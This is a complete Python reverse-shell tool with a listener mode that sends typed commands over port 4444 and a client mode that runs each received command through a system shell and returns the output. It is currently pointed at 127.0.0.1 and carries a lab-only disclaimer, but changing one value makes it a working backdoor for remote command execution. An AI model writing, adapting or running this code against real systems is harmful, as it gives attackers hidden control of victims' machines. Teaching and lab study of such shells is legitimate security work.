# ETHICAL USE: This tool is for authorized lab/educational use only. Localhost only. Do not run against external systems.

import socket
import subprocess
import sys

HOST = "127.0.0.1"
PORT = 4444


def run_listener():
    print(f"[*] Listener started on {HOST}:{PORT} — waiting for connection...")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(1)

    conn, addr = server.accept()
    print(f"[+] Connection received from {addr}")
    print("[*] Type commands. Type 'exit' to quit.\n")

    try:
        while True:
            cmd = input("shell> ").strip()
            if not cmd:
                continue
            if cmd.lower() == "exit":
                conn.send(b"exit\n")
                break
            conn.send((cmd + "\n").encode())
            output = conn.recv(4096).decode(errors="ignore")
            print(output)
    except KeyboardInterrupt:
        pass
    finally:
        conn.close()
        server.close()
        print("\n[*] Listener closed.")


def run_shell():
    print(f"[*] Connecting to {HOST}:{PORT}...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((HOST, PORT))
        print("[+] Connected.")

        while True:
            cmd = sock.recv(1024).decode().strip()
            if not cmd or cmd == "exit":
                break
            try:
                result = subprocess.run(
                    cmd, shell=True, capture_output=True, text=True, timeout=10
                )
                output = result.stdout + result.stderr
            except subprocess.TimeoutExpired:
                output = "[!] Command timed out\n"
            except Exception as e:
                output = f"[!] Error: {e}\n"
            sock.send(output.encode())

    except ConnectionRefusedError:
        print(f"[!] Could not connect. Start the listener first.")
    finally:
        sock.close()
        print("[*] Shell closed.")


def main():
    if len(sys.argv) < 2 or sys.argv[1] not in ("listen", "shell"):
        print("Usage:")
        print("  python payload.py listen")
        print("  python payload.py shell")
        sys.exit(1)

    if sys.argv[1] == "listen":
        run_listener()
    elif sys.argv[1] == "shell":
        run_shell()


if __name__ == "__main__":
    main()
